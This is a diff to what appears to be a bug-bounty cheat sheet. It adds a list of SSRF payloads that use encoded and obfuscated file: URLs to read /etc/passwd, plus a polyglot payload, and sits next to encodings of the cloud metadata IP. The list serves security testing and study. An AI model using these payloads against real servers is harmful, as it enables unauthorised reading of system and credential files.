@@ -203,6 +203,18 @@ All these will be interpreted as `169.254.169.254`:
 2852039166 (integer)
 ::ffff:a9fe:a9fe (IPv6)
 ```
+14-SSRF Payloads for LFR/LFD
+```
+file:/etc/passwd%3F/
+file:/etc%252Fpasswd/
+file:/etc%252Fpasswd%3F/
+file:///etc/%3F/../passwd
+file:${br}/et${u}c%252Fpas${te}swd%3F/
+file:$(br)/et$(u)c%252Fpas$(te)swd%3F/
+```
+*SSRF POLYGLOT*
+
+`file:///etc/passwd?/../passwd`
 # Rate limit bypass
 ![ ](https://raw.githubusercontent.com/rbih-boulanouar/bugbounty/main/Rate%20limit%20bypass.jpeg)
 # Line terminators
